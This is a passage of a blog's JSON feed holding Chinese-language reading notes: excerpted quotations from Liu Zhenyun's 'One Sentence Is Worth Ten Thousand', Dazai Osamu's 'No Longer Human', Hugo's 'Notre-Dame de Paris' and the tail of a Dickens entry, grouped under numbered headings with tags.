4-44</h3>\n<p>我过去遭受的苦难给了我一种特权，使我们得以顺利的通过关卡。</p>\n<p>那架显得小了的磨刀砂轮，却孤零零的伫立在清晨宁静的空气中，上面有一层猩红色，那绝不是阳光所能消退的。</p>\n<p>没有停歇，没有怜悯，没有和平，没有片刻松弛休息，没有时间的划分。虽然昼夜仍如混沌初开时一样，有规律地循环而已，可是别的计时方法却没有了。一个民族在发狂热的时候，也像一个发高烧的病人一样，失去了时间观念。</p>\n<p>把自由和生命的一切保障都扫荡无疑，可以随意把善良无辜的人交给邪恶有罪的人去处置，监狱吞吃了无数并未犯法但又申诉无门的人，这类行径全都变成成规定则。</p>\n<p>本来是一种健康的娱乐，现在却成了使血液沸腾、神志混乱，心硬如铁的手段。其中虽然也有一些优美的动作，但反而使她变得更加丑恶，这说明一切原本善良美好的东西，也会扭曲变质。</p>\n<p>城市里一些最下流，最残忍，最邪恶的居民，今天却成了法庭上的主宰；他们闹嚷嚷的对审判结果评头论足，或高声喝彩，或表示反对，或胡乱推测，推波助澜，毫无顾忌。</p>\n<p>虽然他说了几句亲热话，可那副屈尊赏脸的样子，即使把他们的功过和地位颠倒过来，恐怕也不过如此罢了（不过世界上的事总是这么颠倒的）。</p>\n<p>我就像在兜一个圆圈，越是临近终点，就越是靠近起点了。这似乎是人生旅途上一种给人慰藉，使人在行就将木时心中有个准备的仁慈安排。</p>\n<p>他徘徊过、挣扎过、迷途过，如今终于踏上了正路，并且看到了路的尽头。</p>\n<p>在这毫无公正可言的法庭上，很少或者根本没有任何法律程序，让被告能有合理的申诉机会。他们始终在极度地滥用法律程序和形式。</p>\n<p>正像我们所有贱民都受那帮高贵的人抢夺一样，我们受尽站在那儿的那个人的搜刮 — 他黑心的向我们收租抽税，强迫我们白白替他干活，硬要我们在他的磨坊里磨我们的粮食，逼着我们用那点可怜的粮食替他喂养大群大群的家禽。</p>\n<h3 id=\"4-45\"><a class=\"markdownIt-Anchor\" href=\"#4-45\">#</a> 4-45</h3>\n<p>侯爵从自己的口袋里掏出我写的那封信，给我看了看，然后就着手里提的灯笼的烛火，把它给烧了，烧完还用脚踩了踩纸灰。一句话也没有说。我就给带到了这儿，送进这座把我活埋的坟墓。</p>\n<p>年华如果虚度，生命就毫无价值，这件事是值得一搏的。要是这点都做不到，那就死不足惜了。</p>\n<p>由于人的恶习和疏忽引起的生理上的疾病，会不分贫富贵贱地使所有人感染；而由难以名状的苦难，无法忍受的压迫和毫无心肝的冷漠产生的心理上的紊乱，同样也会不加区别的侵袭每一个人。</p>\n<p>古往今来，人类的想象力创造出了无数贪得无厌、不知餍足的妖魔鬼怪。</p>\n<p>自由啊，多少罪恶，是假你的名义干出来的。</p>\n<p>耶稣说，复活在我，生命也在我。信我的人，虽然死了，也必复活。凡活着心我的人，必永远不死。</p>\n<p>我现在做的，是我一生中做过的最好、最最好的事情；我即将得到的，使我一生中得到过的最安宁，最最安宁的休息。</p>\n",
            "tags": [
                "社会",
                "人性"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/48%E3%80%8A%E4%B8%80%E5%8F%A5%E9%A1%B6%E4%B8%80%E4%B8%87%E5%8F%A5%E3%80%8B%E5%88%98%E9%9C%87%E4%BA%91/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/48%E3%80%8A%E4%B8%80%E5%8F%A5%E9%A1%B6%E4%B8%80%E4%B8%87%E5%8F%A5%E3%80%8B%E5%88%98%E9%9C%87%E4%BA%91/",
            "title": "《一句顶一万句》刘震云",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>因为一个馒头，两人从此成了仇人，见面相互不说话。</p>\n<h3 id=\"4-77\"><a class=\"markdownIt-Anchor\" href=\"#4-77\">#</a> 4-77</h3>\n<p>当初不该让你上学，该让你去当杀人放火的强盗，一来你也不挨打了，二来家里的仇早报了。</p>\n<p>甩开大步，一路走去，见人也不打招呼。有时候顺着大路，有时在野地里。</p>\n<p>碰到无常我也不怕，他要让我走，我就跟他走了。</p>\n<p>病相同，人却不同；不同的人，开同样的方子，药也未必管用。</p>\n<p>老马本来只是随便说说，好止住老杨的啰唆，没想到老杨当了真，反倒更啰嗦了。</p>\n<p>一个学生娃，能说啥？他说啥没啥，只是这爱说，就令人厌倦。</p>\n<p>人心毒不是说他狠，是说大家遇事儿都不往好处想，盼着事坏。</p>\n<p>富贵未必不必烦恼，贫贱未必不是好夫妻。只要心气顺，吃口窝头也安然。</p>\n<p>也许越描越黑，不是自己的不是，也成了自己的不是。</p>\n<p>他们就喜欢看得见摸得着的发生在身边的张三李四的实事。</p>\n<h3 id=\"4-78\"><a class=\"markdownIt-Anchor\" href=\"#4-78\">#</a> 4-78</h3>\n<p>当时也就是一个痰，现在和 “延津新学” 和抓阄的事联系起来，痰就不是痰了。</p>\n<p>杀鸡、杀狗和杀猪，就是讨个生活，与哪一只鸡狗和猪都无冤无仇，一开始有些心怯，但时间长了，刀把子按下去，一个事情就结束了。</p>\n<p>原本杀老马并不是为了杀老马，而是为了杀给人看。他跟这些人，原本都有仇。</p>\n<p>世界上的事情，原来件件都藏着委屈。</p>\n<p>老张吭吭着鼻子：信了他，你就知道你是谁，从哪儿来，到哪去。<br>\n我本来就知道呀，我是一只杀猪的，从曾家庄来，到各村去杀猪。</p>\n<p>一年也就是转眼的光景，杨摩西想起来却恍若隔世。</p>\n<p>延津就找不出这么执意的人，不管干啥事儿，十个有九个半，当时见不着利，就望风跑路了。</p>\n<p>一百多个角色，每一个角色都无法替代，每一个角色都不可或缺，突然一个角色没了，链条就断了。</p>\n<p>过去在生活里埋着，看不出来，现在涂上油彩，穿上彩衣，这英俊就透了出来。</p>\n<p>有活儿干就不能叫累，没活干等活儿的时候，才叫累呢。</p>\n<p>同时种菜，在县政府种菜，又和在村子里种菜不一样。</p>\n<p>过去我以为帮我的会是人，或是主，谁知是个社火。</p>\n<p>姜虎平日不爱说话，也讨厌别人说废话。啥叫废话？说些已经过去没用的事。啥叫有用的活？张罗前面的有用的事。</p>\n<p>人要一赌上气，就忘记了事情的初衷，只想能气着别人，忘记也耽误了自己。</p>\n<p>从早到晚，手闲不下来。但累归累，心里却轻松许多。过去挑水是他等活，现在种菜是活等他，干活再累，也比找不着活强。</p>\n<p>在世上活了二十来年，他最喜欢那一喊。</p>\n<p>但大家信不信，老史并不在意，平日见人，仍是不言苟笑，为输赢者皆是俗物，而为手拉手共同去一个没去过的地方。</p>\n<p>对眼前这个世界，老史失望的不是一个人，而是整个大家。</p>\n<p>他说媒不单图个吃喝、或图个东西，东西之外，主要图个说过，过嘴瘾。</p>\n<p>我活一天，等于别人活十年，值了。</p>\n<h3 id=\"4-79\"><a class=\"markdownIt-Anchor\" href=\"#4-79\">#</a> 4-79</h3>\n<p>两个钟头说了八点，他说的每一点，都与实情不符；稍微接近的，也隔靴搔痒；不熟的干脆本末倒置。</p>\n<p>一步步走来，没有一步步坎坷；步步坎坷，好不容易有个安生日子，有人又要赶自己走。步步坎坷没把吴摩西逼到绝路，一个互不相干的倪三，倒把他逼到了绝路。</p>\n<p>大爷，咱们都不是小孩了，你就别揣着明白装糊涂了。</p>\n<p>今天既然来了，就没想活着回去，我是杀一个够本，杀两个赚一个。</p>\n<p>今天不给个说法，我绝不会就此罢休！</p>\n<p>见什么人说什么话，一天馒头卖下来，卖馒头不累，说话累。</p>\n<p>面上求着别人，话上就得吃些亏，也不全是口才的问题。</p>\n<p>他想起话来，就回一嘴，想不起来就闷着头不说话。十次有八次，想起的时候少，想不起的时候多。</p>\n<p>心里痒痒不光图个玩，而是比起琐碎的日子，扮起别人，能让人脱离眼前的生活。</p>\n<p>突然醒来，窗外鸡叫了，觉得一切恍如隔世。五更鸡叫，又得起来蒸馒头。</p>\n<p>跟吴香香过的这大半年日子，好像只是影子中的事。</p>\n<p>吴摩西活了二十一年，以为世上的事，一多半是说不清楚的，只好清楚不了糊涂了。</p>\n<p>街上的事，一件事就是一件事，家里的事，一件事扯着八件事。</p>\n<p>一个人总顺着别人的心思来，自己心里就有些别扭；但一个人自己别扭，也比再让别人别扭自己强。</p>\n<p>老詹传教虽无传给别人，但传给了他自己。老詹在时，吴摩西不信主。现在老詹死了，吴摩西也不想信主，但老詹这个人，让他信了。</p>\n<p>他发现自己的内心，还有闪亮的一面。原来闪亮的一面，就是狠毒的一面。</p>\n<p>成山成海的人，不知他们从哪里来，又往何处去。</p>\n<p>这么多人，出门干的都是正事，唯有一个吴摩西，出门干的事对人说不出口，假装在找跟人跑了的老婆。</p>\n<p>有什么烦恼，要借别人的热闹来解的？这下好了，旧的烦闷没解，又添了新的烦闷，相对巧玲丢了，那些烦闷就不叫烦闷。</p>\n<p>他这些年的遭遇，没有一步不坎坷，但所有的坎坷加起来，都比不上巧玲丢了。</p>\n<h3 id=\"4-80\"><a class=\"markdownIt-Anchor\" href=\"#4-80\">#</a> 4-80</h3>\n<p>天天扛完大包就在附近寻人，他不仅仅是为了一个找，而是为了让自己心安。</p>\n<p>凡事过去待过的地方，去过的地方，一并都伤了心。他要离开本地和亲族，离开伤心之地，却无处可去，也无人指引。</p>\n<p>吴摩西活到现在，和罗长礼关系最大。但他和罗长礼，迄今为止还没说过一句话。</p>\n<p>因为一个馒头，两人从此成了仇人，见面相互不说话。</p>\n<p>五年后的冯文修，已不是五年前的冯文修。五年前，冯文修的眼前是清澈的，现在浑浊了。眼睛浑浊倒没啥，可却染上了喝酒的毛病。</p>\n<p>不爱说话和没话说是两回事。不爱说话是心里还有话，没话说是干脆什么都没了。</p>\n<p>不是想不想离婚，是自己离不离得起，这才是你犹豫的原因。</p>\n<p>牛爱国遇到烦心事，就指不上陈奎一。陈奎一的脑子比牛爱国还乱。牛爱国能把一件事说成两件事，陈奎一能把一件事说成四件事。</p>\n<p>两人平日的好，都在小处；一遇大事，他就露出了本相。</p>\n<p>路上我找一条绳，找不着布袋，我也就上吊了，六十多块大洋，我赔不起东家。</p>\n<p>戏里说的事，也是世上的事，怎么戏里说的，就比世上的有意思呢？</p>\n<p>世上的人遍地都是，说的着的人千里难寻。</p>\n<p>懂道理的人，才跟他理论；这吵来吵去，也吵不出个子丑寅卯，就为磨嘴。</p>\n<p>两个人吵起嘴来，无论一开始吵的是什么，吵着吵着，最后总能归到延津，延津成了两人吵架的缘起，也成了两人吵架的落脚处。</p>\n<p>会说话不是说他话多、嘴不停，而是说起话来，不与你抢话，有话让你先说，他再接着说。</p>\n<p>她找的候宝山，不是这个候宝山，她要找的人，在这个世界上已经死了。</p>\n<p>她小时候记得的延津，和 33 年后的延津，是两个地方。</p>\n<p>两人本来无话，专门找来的话，就显得勉强；两人说不来，就无所谓坏话还是好话。</p>\n<p>乐陵也好，沧州也罢，无非是个存身的地方，对牛爱国倒没啥区别。</p>\n<p>我活了 70 岁，明白了一个道理，世上别的东西都能挑，就是日子没法挑。</p>\n<h3 id=\"4-81\"><a class=\"markdownIt-Anchor\" href=\"#4-81\">#</a> 4-81</h3>\n<p>世上的人千千万万，到了走投无路之时，能指的上的才有两个人。</p>\n<p>世事真奇妙，牛爱国也不知道一个月后，自己就变成了另外一个人。</p>\n<p>让人看不起倒没什么，从此可以和他一辈子不见面，关键是自己想起来，一辈子觉得窝囊。</p>\n<p>或者，有话不说除了是失望，还有对他们的无奈。</p>\n<p>事情想不明白，你的忧愁还少些，事情想明白了，反倒更忧愁了。</p>\n<p>人说什么，就是什么；人说什么，他都应承，一切都无可无不可。</p>\n<p>说的是什么过后也忘了，记得的就是一个说。</p>\n<p>解释不清不是事情不好解释，而是事情之中藏着的曲里拐弯地道理，一时无法说清楚。</p>\n<p>妈都不会说话了，咱就听她一回吧，有啥事，我担着。</p>\n<p>一天遇到十件事，九件事能不说就不说，按照事情的理儿去做就是了；剩下的一件事不是一个理儿，而是仨理儿，挑理的时候不得不说。</p>\n<p>我现在结婚，不是为了结婚，就是想找一个人说话。整天一个人，憋死我了。</p>\n<p>就像 70 年前，吴摩西带着巧玲，两人共同出去假找吴香香一样。</p>\n<p>能找到是幸运，找不到也不损失啥，也算一个找，比漫无目的的在世界上乱转，在路上也总有一个盼头。</p>\n<p>即便你解决掉了目前所有的问题，但也解不了你心里的烦闷。</p>\n<p>日子是过以后，而不是过从前。我要想不清楚这一点，也活不到今天。</p>\n",
            "tags": [
                "社会",
                "人性"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/4%E3%80%8A%E4%BA%BA%E9%97%B4%E5%A4%B1%E6%A0%BC%E3%80%8B%E5%A4%AA%E5%AE%B0%E6%B2%BB/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/4%E3%80%8A%E4%BA%BA%E9%97%B4%E5%A4%B1%E6%A0%BC%E3%80%8B%E5%A4%AA%E5%AE%B0%E6%B2%BB/",
            "title": "《人间失格》太宰治",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>这个世上不乏不幸之人，不，尽是些不幸之人。</p>\n<h3 id=\"2-107\"><a class=\"markdownIt-Anchor\" href=\"#2-107\">#</a> 2-107</h3>\n<p>我对受人尊敬这一状态进行了如下定义：近乎完美无缺地蒙骗别人，尔后又被某个全智全能之人识破真相，最终原形毕露，被迫当众出丑，以致于比死亡更难堪更困窘。即使依靠欺骗赢得了别人的尊敬，无疑也有某个人谙熟其中的真相。</p>\n<p>无论是诉诸父母，也不管诉诸警察，或是政府，最终难道不是照样被哪些深谙世故之人强词夺理击败了吗？本来诉诸于人就是徒劳无益的。所以，我依旧对真实的事情一言不发，默默忍耐着除了继续扮演滑稽逗笑角色之外已别无选择。</p>\n<p>相互欺骗，却又令人惊奇地不受任何伤害，甚至于就好像没有察觉到彼此在欺骗似的，这种不加掩饰从而显得清冽、豁达的互不信任的例子，在人类生活中比比皆是。</p>\n<p>然而我却在那里一直进行着表演，并取得了相当大的成功。</p>\n<p>尽管我表面上依旧扮演着可悲的滑稽角色来博得众人发笑，但有时候也情不自禁地发出重重的叹息。无论我干什么，都肯定会被那个竹一彻底识破真相，并且他还会很快向每一个人透露这个秘密。</p>\n<p>在迄今为止的生涯中，我曾经无数次祈望过自己被杀死，却从来也没有动过杀死别人的念头。这是因为我觉得，那样做只会给可怕的对手带来幸福的缘故。</p>\n<p>女人似乎能够比男人更贪婪的吞噬快乐。</p>\n<h3 id=\"2-108\"><a class=\"markdownIt-Anchor\" href=\"#2-108\">#</a> 2-108</h3>\n<p>对人感到过分恐惧的人，反倒更加迫切地希望用自己的眼睛去看更可怕的妖怪，越是容易对事物感到胆怯的神经质的人，就越渴望暴风雨降临的更加猛烈。</p>\n<p>竭力想把觉得美的东西原封不动地描绘为美是幼稚和愚蠢乃至完全谬误的。绘画大师利用主观力量，对那些平淡无奇的东西加以美的创造，虽说他们对丑恶的东西感到恶心呕吐，却并不隐瞒对它们的兴趣。从而沉浸在表现的愉悦中。换而言之，他们丝毫不为别人的看法左右。</p>\n<p>这就是隐匿在内心深处的自己的真实面目，背负着如此阴郁的心灵。</p>\n<p>我根本无法过那种集体的生活，那种群众生活只会在我耳朵里唤起一阵凛冽的寒气，使我与那种 “年轻人的蓬勃朝气” 格格不入。</p>\n<p>尽管与我的表现方式大相径庭，在彻底游离于人世的营生之外、迷惘彷徨这一点上，毕竟属于同类。而且他是在无意识中实施着逗笑的丑角行为，全然没有觉察到这种丑角行为的悲惨。</p>\n<p>酒、香烟和妓女，是能够帮助人暂时忘却人的可怕的绝妙手段。</p>\n<p>人世的底层毕竟存在某种绝不单纯是经济的、而是近乎怪诞的东西。</p>\n<p>世上称为 “合法” 的东西才更可怕，其中的复杂结构更是不可理喻。我不能死守在一个没有门窗的寒冷房间里，既便外面是一片不合法的大海，我也要纵身跳下去。哪怕是马上死去，我也心甘情愿。</p>\n<p>有一种说法叫做 “见不得人的人”，就是那些人间的悲惨的失败者，悖道者。我觉得自打一出生我就是个 “见不得人的人”，所以一旦遇到人世所谤的同类，就不由分说，变得善良温柔了。</p>\n<p>我每时每刻都受一种 “狂人意识” 的折磨，它却又是与我休戚与共的糟糠之妻，厮磨着，进行凄寂的游戏。这已经成了我的生存方式。</p>\n<p>在襁褓中这种伤痕就赫然出现在我的一条腿上，随着长大非但没有治愈，反而日益加剧，扩散到骨髓深处。每夜的痛苦就如千变万化的地狱。</p>\n<p>尽管只是一面之交，但由于这种思索，我仍然感受到一种被束缚住而无法动弹的忧虑和恐惧。</p>\n<h3 id=\"2-109\"><a class=\"markdownIt-Anchor\" href=\"#2-109\">#</a> 2-109</h3>\n<p>早晨，我睁眼醒来翻身下床，又变成了原来那个浅薄无知、善于伪装的滑稽角色。胆小鬼连幸福都会惧怕，碰到棉花都会受伤，有时也会被幸福所伤。趁着还没有受伤，我想就这样赶快分道扬镳。</p>\n<p>我竭力避免介入人与人之间的芥蒂，害怕卷入那样的漩涡之中。</p>\n<p>她早已被人世的生活折磨得筋疲力尽，而我一想到自己对人世的恐惧和生存的烦忧，似乎就再也无法忍耐着活下去了。</p>\n<p>我的所有家当就只有此刻穿在身上的碎花布和服与斗篷了，这便是我的现实。我清醒的意识到自己已经走投无路了。</p>\n<p>世上所有人的说法，总是显得拐弯抹角，含糊不清，其中有一种试图逃避责任的微妙性和复杂性。对于他们那种近于徒劳无益的防范心理和无数的小小计谋，我总是感到困惑不已，最后只得听之任之，随他而去。</p>\n<p>所有的交往都只会给我带来痛楚，为了排遣这种痛楚，我拼命地扮演丑角，累的精疲力竭。</p>\n<p>所谓世间，又是什么呢？是人的复数吗？可哪儿存在着 “世间” 这个东西的实体呢？迄今为止，我一直以为它是一种苛烈，严酷，而且可怕的东西，并且一直生活在这种想法之中。</p>\n<p>为了适应眼前的需要，我多少学会了一些厚颜无耻。</p>\n<p>尽管我曾今认为，童贞的美丽不过是愚蠢的诗人所抱有的天真而悲伤的幼觉罢了，可我现在发现，它确实真真切切地存在于这个世界上。</p>\n<p>罪的反义词是法律？或许世人都是抱着那样一种简单的想法而装模作样的生活着。以为罪恶，只是在没有警察的地方蠢蠢欲动。</p>\n<p>善恶的概念是由人创造出来的，是人随随便便创造出来的道德词语。</p>\n<p>我是一个畏缩、光看别人脸色行事、对他人的信赖之心已经裂纹从生的人。</p>\n<p>疑心生疑心，结果形成了一个恶性循环的怪圈。可我却没有勇气去加以证实，以致于被那惯有的不安和恐惧纠缠着，只能在喝的醉醺醺之后才敢小心翼翼地试着进行卑屈的诱导性审讯。</p>\n<p>这个世上不乏不幸之人，不，尽是些不幸之人。</p>\n<h3 id=\"2-110\"><a class=\"markdownIt-Anchor\" href=\"#2-110\">#</a> 2-110</h3>\n<p>我是罪孽的凝固体，所以我只能变得越来越不幸，而这是无法阻止和防范的。</p>\n<p>她也肯定是一个不幸的人，因为不幸的人总是对别人的不幸敏感万分。</p>\n<p>我的周围总是笼罩着某种浑浊而灰暗的，见不得人的可疑气氛。</p>\n<p>事态已经不可挽回。无论干什么，都是徒劳一场，都只会丢人现眼，雪上加霜。只会在污秽的罪恶上增添可耻的罪恶，让烦恼变得更加强烈。</p>\n<p>对于我来说，如今已经不再存在着什么幸福与不幸福的人了。只是一切都将过去。在我一直痛苦不堪地生活过来的这个所谓的 “人” 的世界里，唯一可以视为真理的东西，就只有这一样。</p>\n<p>人一旦变成那个样子，就已经不行了。</p>\n",
            "tags": [
                "生命",
                "人生哲学"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/45%E3%80%8A%E5%B7%B4%E9%BB%8E%E5%9C%A3%E6%AF%8D%E9%99%A2%E3%80%8B%E9%9B%A8%E6%9E%9C/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/45%E3%80%8A%E5%B7%B4%E9%BB%8E%E5%9C%A3%E6%AF%8D%E9%99%A2%E3%80%8B%E9%9B%A8%E6%9E%9C/",
            "title": "《巴黎圣母院》雨果",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>对于这个年轻人来说，好像生活的唯一目的就是学习。</p>\n<h3 id=\"4-45\"><a class=\"markdownIt-Anchor\" href=\"#4-45\">#</a> 4-45</h3>\n<p>实在再也没有一出戏能比这出戏更富有戏剧性了。</p>\n<p>然而情况就是这样，谁都对那样美妙演出不感兴趣，也不理解。</p>\n<p>他们不过是在耍嘴皮罢了。这些都是胆小鬼，只会相互咒骂。</p>\n<p>什么反对都是徒然的，除了听之任之，没有别的办法。</p>\n<p>这座邢台和绞刑架紧挨着矗立在路当中，使那要命的地方断送了性命。那是担心被绞死的病，是一切被绞死的病，是一切病症中最可怕的一种，因为他不是出于天意，而是来自人为。</p>\n<p>没有面包，没有住处，发现自己所需要的一切全都没有，他便更加倍地需要他们。哲人的一生，他的命运老是攻击他的哲学。</p>\n<p>他欣赏着由于使使他感到被人憎恨因而也被他憎恨的人们的音乐。他们的民众不过是一群愚人、残废人，小偷和乞丐，那又有什么关系！他们总是民众。</p>\n<h3 id=\"4-46\"><a class=\"markdownIt-Anchor\" href=\"#4-46\">#</a> 4-46</h3>\n<p>封锁在这残废的躯壳里面的灵魂，它本身对于残废和聋哑必然是最容易感触的，但他当时所感觉到的却还是绝对的模糊不清，一片混沌。</p>\n<p>在他对自己的意愿甘心放弃之中，在那屈从的怪念头里面，无疑有着奇特的独立性与盲目顺从性的混合物 — 介于自由和不自由之间的某种东西。</p>\n<p>他们建造了一座假想的海市蜃楼 — 那只不过是一种纸糊的堡垒。</p>\n<p>它是一个大蜂窝，那个秩序井然的社会里全体雄蜂每天都带着赃物回到那里。他们全身盖满了用彩色颜料画出来的脓疮，白天是乞丐，晚上就变成强盗。总之它是个庞大的更衣室，那个时代巴黎街道上一切盗窃、卖淫和暗杀事件这类永恒喜剧的扮演人，都是在那里上装和卸妆的。</p>\n<p>在那梦魇里，一切轮廓仿佛都在颤抖，一切形象仿佛都在狞笑，一切事物仿佛都在堆叠，物体膨胀得有如龙蛇狮虎，人们则如妖魔鬼怪。</p>\n<p>好愿望不会给晚饭多添一个葱头，除了能让我们进天堂之外也没有别的用处。</p>\n<p>对于这个年轻人来说，好像生活的唯一目的就是学习。</p>\n<p>被关闭在书斋里狂热地学习一切和研究一切，知道那时为止他一直专注于他那研究科学而发展起来的理解力和日益增长的文学方面的想象力，这位可怜的学者还没有时间去感觉他的心的存在。</p>\n<p>现在，假若我们试着透过厚实粗糙的皮囊去探索加西莫多的灵魂，假若我们能去探索这粗等躯体的深处，假若我们决心去照亮这个不透明的身体，去探寻这迟钝的生物昏暗的内心，我们一定会发现那不幸的灵魂的姿态是多么可怜、畸形、伛偻。</p>\n<p>事物的映象在到达他的思想之前，先遭遇到一定程度的折射。他的头脑是一个奇特的中心，经由它出来的概念都是扭曲的，这种折射所造成的映象，当然是散漫的和迷乱了的。</p>\n<p>人们感到某种事物已经离去，这个庞大的躯体已经变得空空洞洞。它是一具骷髅，精灵已经飞去，现在只能见到它过去寄居的地方，它就像一具颅骨，虽然有两个眼眶，可是再也没有眼睛的光芒了。</p>\n<h3 id=\"4-47\"><a class=\"markdownIt-Anchor\" href=\"#4-47\">#</a> 4-47</h3>\n<p>因为克洛德在青年时代就已经遍历了人类学问中正面的、外部的和合法的范畴，使得他不得步走远些去为他难以满足的求知欲觅取粮食，除非他认为 “一切都到了尽头” 而止步不前。</p>\n<p>人们吸尽了合法的知识之后，就敢于深入到非法的知识里去。人们说他尝遍了智慧树上所有的果实，由于饥饿或者嘴里没味，终于咬起禁果来了。</p>\n<p>当人们看见他主仆俩相偕穿过那些荒僻狭窄而且被泥泞弄得阴暗潮湿的街道时，就冲他们几句恶言，几声讥讽或几句嘲骂来凌辱他们，而克洛德只管昂头走路，让那些拦路谩骂的家伙看着他那严峻的额头发呆。</p>\n<p>但这种伤害往往是在副主教和敲钟人不知不觉之中进行的，加西莫多太聋，克洛德太耽于梦幻，都听不见所有这些 “赏心悦耳” 的话。</p>\n<p>神圣的象征在自由思想下面失去影响和消失，那时候人就要躲开神甫，哲学与制度的肿瘤就要侵蚀宗教的面目，它那些正面写得满满的篱页，反面将会是空空如也，它的作品将被大肆删节，它的书将会是不完整了。</p>\n<p>加西莫多除了自己的丑陋之外一无所有，单凭这一点就能说明人们为什么剑拔弩张了。他沮丧、安静、不出一声。他只是偶尔对捆着他的绳索愤怒地看上一眼。</p>\n<p>这个隔绝在人类之外而被算进死人行列的活人，这盏在黑夜里燃尽了最后一滴油的灯，这个在墓穴里闪烁着残余的生命，这张永远转向另一个世界的面孔，这双已经被另一个太阳照耀着的眼睛，这对倾听坟墓谈话的耳朵，这囚禁在躯体内部的灵魂，这禁锢在囚牢里的躯体，所有如今唤起我们记忆的一切，当时的人们却毫没想到。</p>\n<p>那些悲悯笼统的看待事物、崇奉并敬重一切牺牲，并且在必要时视之为神圣，但不去分析那些遭遇，只是给予一点可怜的同情罢了。</p>\n<p>事实上灵魂并没有离开那毫无生气的，梦尘尘的躯体，至少他退避或隐藏到深处，而外界的声音已不能再到达那里了。</p>\n<p>人民，尤其是中世纪的人民，在社会上就像孩子们在家庭里一样，他们长久停留在原始的无知状态里，停留在道德与智力的幼稚阶段，可以用形容儿童来形容他们：在这种年纪里是没有怜悯心的。</p>\n<h3 id=\"4-48\"><a class=\"markdownIt-Anchor\" href=\"#4-48\">#</a> 4-48</h3>\n<p>那时一副呆定定的目光，然而充满着烦恼与不安。他全身凝然不动，只是偶尔机械地颤抖一下，好像被风摇动的树木一样。</p>\n<p>各种语言混在一起，一个盖住一个，新的字迹盖没了旧的字迹，就像参差不齐的树枝相互错着，那是一切哲学，一切梦幻，一切人类学问杂乱的混合。</p>\n<p>这个心地坦白的人，这个除了自然法则之外便不知世上还有别种法则的人，这个听凭感情自然流露的人，他心里强烈感情的湖泊永远是干涸的，他十分习惯于每天早上挖些新的沟渠来把其中的水排掉。</p>\n<p>用伊壁鸠鲁的话来说，我是缺少一种没什么用的无名的东西。</p>\n<p>你飞向科学，飞向光明，飞向太阳，你只想去到自由的空气里，去到永恒真理的无边的光辉里，可是，当你迫近那开向另一个世界，开向那光明的世界，那智慧、与科学的世界的灿烂的窗口时，盲目的苍蝇啊，愚蠢的学者啊，你却没想到，命运已经把薄薄的蛛网张挂在了光明和你之间。</p>\n<p>凡是你们希望我招认的我全都招认，还是快点杀死我吧。</p>\n<p>事实上，天上人间同样不公平，要摧毁这么一个柔弱的人，根本用不着那么多的苦难和酷刑。</p>\n<p>她被沉重的铁链压着，蜷伏在一张草席上。她像黑夜一般冰冷，像死人一般冰冷，头发里没有一点空气，耳朵里也听不到一点人声，眼睛看不见一缕眼光。她毫不动弹，也不呼吸，甚至也不觉得难受。</p>\n<p>自从来到了这里，她不是醒着，也不是睡着，在这个不幸之中，在这个地牢里面，她再也分不清醒着和做梦，分不清梦境和现实，分不清白天和黑夜，一切都是混乱的，破碎的，都是她思想里飘荡着、流散着。</p>\n<p>在教堂里、在大街上、在田野里，魔鬼曾经多次用在我面前经过的妇女的模糊影子来诱惑我，但是他们很少出现在我的思想里，我轻易地就将魔鬼打败了。</p>\n<p>当热情的大脑开始失望的时候，科学变得多么空虚。</p>\n<h3 id=\"4-49\"><a class=\"markdownIt-Anchor\" href=\"#4-49\">#</a> 4-49</h3>\n<p>从此，我在书本和我自己身上看到了什么？它们的形象与以往大不相同。这个形象不再是原来的颜色，它变成了阴森的、惨淡的、幽暗的，好像望太阳望的太久之后在眼前跳动的一圈黑影。</p>\n<p>他不知道自己是在什么地方，在想着和梦着什么。他毫无选择的碰到哪条街就向哪条街走去或跑去，然而老是被可怕的格雷沃广场追赶着，直往前奔，因为他觉得格雷沃广场就在他的身后。</p>\n<p>他想到那些永恒誓言的愚蠢，想到贞操、科学、宗教和真理的空虚，上帝的无能，他狂喜地沉浸在自己的恶念里，沉的越深，他越觉得心头爆发一种撒旦的狞笑。</p>\n<p>他就这样一直跑到黄昏时分，这种想逃避自然，逃避生活，逃避自己，逃避人类，逃避上帝的奔跑，继续了整整一天。</p>\n<p>他呆呆地直立格雷沃广场上，往前面望去，可是再也看不见什么东西，一切都在跳动和膨胀，使他觉得全都像怪物一样。一种深重的痛苦引起的疲乏，往往在心里产生这样的结果。</p>\n<p>我的不幸正因为我还是过分像人，我情愿完全是一头畜牲，像这只山羊一般。</p>\n<p>人的心只容得下一定程度的绝望，海绵已经吸够了水，即使大海从它上面流过，也不能再给他增添一滴水了。</p>\n<p>起先我爱过女人，后来我爱过禽兽，现在我爱石头。它们也同女人和禽兽一样可爱，而且没有那么虚伪。</p>\n<p>你这样一个半聪明半疯癫的家伙，你这毫无用处像草一样的东西，你这种自以为会走路会思想的草木，你却要用你从她那里偷来的生命活下去，像大白天点的蜡烛一样毫无用处的活下去。</p>\n<p>她的柔弱、她的无处逃避，她的无依无靠，她的孤立无援等等念头又一齐占据了她的心。她跪下来，双手抱着头靠在垫褥上，浑身哆嗦。</p>\n<p>我是个学者，却辱没了学科；我是个绅士，却败坏了自己的名声。我是个神甫，却把弥撒书当做淫欲的枕头，向上帝的脸上吐唾沫。</p>\n<h3 id=\"4-50\"><a class=\"markdownIt-Anchor\" href=\"#4-50\">#</a> 